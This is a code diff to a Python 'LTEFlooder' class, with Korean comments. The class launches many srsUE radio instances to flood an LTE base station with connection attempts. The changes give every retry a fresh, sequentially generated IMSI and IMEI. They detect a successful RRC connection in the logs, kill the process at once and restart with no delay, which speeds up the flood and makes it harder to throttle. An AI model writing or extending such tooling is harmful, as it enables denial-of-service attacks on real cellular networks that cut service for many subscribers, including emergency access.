@@ -52,6 +52,10 @@ class LTEFlooder:
         
         # .env 파일에서 USIM 키 로드
         self.usim_opc, self.usim_k = self._load_usim_keys()
+        
+        # 각 인스턴스별 실행 횟수 카운터 (고유한 IMSI/IMEI 생성을 위해)
+        self.instance_counters = {}
+        self.counter_lock = threading.Lock()
     
     def _load_usim_keys(self) -> tuple[str, str]:
         """환경변수 또는 .env 파일에서 USIM 키 로드"""
@@ -84,8 +88,8 @@ class LTEFlooder:
         
         return opc, k
         
-    def create_ue_config(self, instance_id: int) -> str:
-        """각 인스턴스별 고유한 설정 파일 생성"""
+    def create_ue_config(self, instance_id: int, unique_id: int) -> str:
+        """각 인스턴스별 고유한 설정 파일 생성 (재실행마다 새로운 IMSI/IMEI)"""
         # EARFCN 설정 (주파수)
         # 주파수를 지정하지 않고 MCC/MNC만 지정한 경우, 주파수 스캔을 비활성화
         # (srsUE가 자동으로 모든 주파수를 스캔하도록)
@@ -116,21 +120,30 @@ class LTEFlooder:
             else:
                 logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (주파수: EARFCN {earfcn_value})")
         
-        # IMSI 포맷: MCC(3자리) + MNC(2-3자리) + MSIN(나머지)
+        # IMSI 포맷: MCC(3자리) + MNC(2-3자리) + MSIN(나머지, 최대 15자리)
+        # unique_id를 사용하여 매번 다른 IMSI 생성
         if self.mcc is not None and self.mnc is not None:
             # 둘 다 지정된 경우
             mnc_digits = 3 if self.mnc >= 100 else 2
-            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}0000000{instance_id:03d}"
+            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
+            mcc_mnc_len = 3 + mnc_digits
+            msin_len = 15 - mcc_mnc_len
+            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
         elif self.mcc is not None:
             # MCC만 지정된 경우 (MNC는 기본값 01 사용)
-            imsi = f"{self.mcc:03d}0100000000{instance_id:03d}"
+            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
+            imsi = f"{self.mcc:03d}01{unique_id:010d}"
         elif self.mnc is not None:
             # MNC만 지정된 경우 (MCC는 기본값 001 사용)
             mnc_digits = 3 if self.mnc >= 100 else 2
-            imsi = f"001{self.mnc:0{mnc_digits}d}0000000{instance_id:03d}"
+            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
+            mcc_mnc_len = 3 + mnc_digits
+            msin_len = 15 - mcc_mnc_len
+            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
         else:
             # 둘 다 지정되지 않은 경우
-            imsi = f"0010100000000{instance_id:03d}"
+            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
+            imsi = f"00101{unique_id:010d}"
         
            config_content = f"""[rf]
 device_name = uhd
@@ -150,19 +163,30 @@ algo = milenage
 opc  = {self.usim_opc}
 k    = {self.usim_k}
 imsi = {imsi}
-imei = 353490069873{instance_id:03d}
+imei = 353490069873{unique_id:06d}
 """
-        config_path = f"srsue_{instance_id}.conf"
+        config_path = f"srsue_{instance_id}_{unique_id}.conf"
         with open(config_path, 'w') as f:
             f.write(config_content)
         return config_path
     
     def run_srsue_instance(self, instance_id: int):
-        """단일 srsUE 인스턴스 실행"""
-        config_path = self.create_ue_config(instance_id)
+        """단일 srsUE 인스턴스 실행 (연결 성공 시 즉시 종료하여 빠른 재연결)"""
         log_file = f"srsue_{instance_id}.log"
+        attempt_count = 0
         
         while self.running:
+            # 매번 새로운 고유 ID 생성
+            with self.counter_lock:
+                if instance_id not in self.instance_counters:
+                    self.instance_counters[instance_id] = 0
+                self.instance_counters[instance_id] += 1
+                attempt_count = self.instance_counters[instance_id]
+            
+            # 고유한 ID 생성: instance_id * 100000 + attempt_count
+            unique_id = instance_id * 100000 + attempt_count
+            config_path = self.create_ue_config(instance_id, unique_id)
+            
             try:
                 logger.info(f"UE 인스턴스 {instance_id} 시작 중...")
                 cmd = [
@@ -188,17 +212,56 @@ imei = 353490069873{instance_id:03d}
                 
                 self.processes.append(process)
                 
-                # 프로세스가 종료될 때까지 대기
-                process.wait()
+                # 연결 성공 감지를 위한 로그 모니터링
+                connection_success = False
+                start_time = time.time()
+                max_wait_time = 30  # 최대 30초 대기 (연결 시도 시간)
+                
+                while process.poll() is None and (time.time() - start_time) < max_wait_time:
+                    # 로그 파일에서 연결 성공 여부 확인
+                    if os.path.exists(log_file):
+                        try:
+                            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                                log_content = f.read()
+                                # 연결 성공 키워드 확인
+                                if any(keyword in log_content.lower() for keyword in [
+                                    'rrc connection setup complete',
+                                    'rrc connected',
+                                    'attached',
+                                    'registered'
+                                ]):
+                                    connection_success = True
+                                    logger.info(f"UE 인스턴스 {instance_id} 연결 성공 - 즉시 재시작")
+                                    break
+                        except:
+                            pass
+                    
+                    time.sleep(0.5)  # 0.5초마다 로그 확인
+                
+                # 연결 성공했거나 타임아웃이면 프로세스 종료
+                if process.poll() is None:
+                    process.terminate()
+                    try:
+                        process.wait(timeout=2)
+                    except subprocess.TimeoutExpired:
+                        process.kill()
+                        process.wait()
+                
+                # 프로세스가 이미 종료된 경우
+                if process.poll() is not None:
+                    pass
                 
                 if self.running:
-                    logger.info(f"UE 인스턴스 {instance_id} 재시작 중... (간격: {self.interval}초)")
-                    time.sleep(self.interval)
+                    # interval이 0이면 즉시 재시작, 아니면 지정된 간격만큼 대기
+                    if self.interval > 0:
+                        time.sleep(self.interval)
+                    # interval이 0이면 바로 재시작 (대기 없음)
                     
             except Exception as e:
                 logger.error(f"UE 인스턴스 {instance_id} 오류: {e}")
                 if self.running:
-                    time.sleep(self.interval)
+                    if self.interval > 0:
+                        time.sleep(self.interval)
     
     def start(self):
         """Flooding 시작"""
